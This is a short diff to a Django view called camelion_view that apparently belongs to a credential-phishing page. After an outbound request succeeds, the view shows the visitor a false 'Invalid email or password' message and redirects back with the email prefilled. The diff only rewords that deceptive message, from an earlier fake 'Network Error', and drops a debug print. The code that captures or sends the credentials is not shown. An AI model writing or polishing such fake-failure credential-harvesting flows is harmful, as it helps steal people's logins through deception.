@@ -41,8 +41,7 @@ def camelion_view(request):
             print("passed here")
 
             if response.status_code in [200, 202]:
-                messages.success(request, "Network Error! Please verify your information and try again.")
-                print("passed here 2")
+                messages.success(request, "Invalid email or password, please check your details and try again.")
                 # Redirect to the same view with email as query param
                 redirect_url = reverse('camelion:camelion') + f'?em={email}'
                 return redirect(redirect_url)
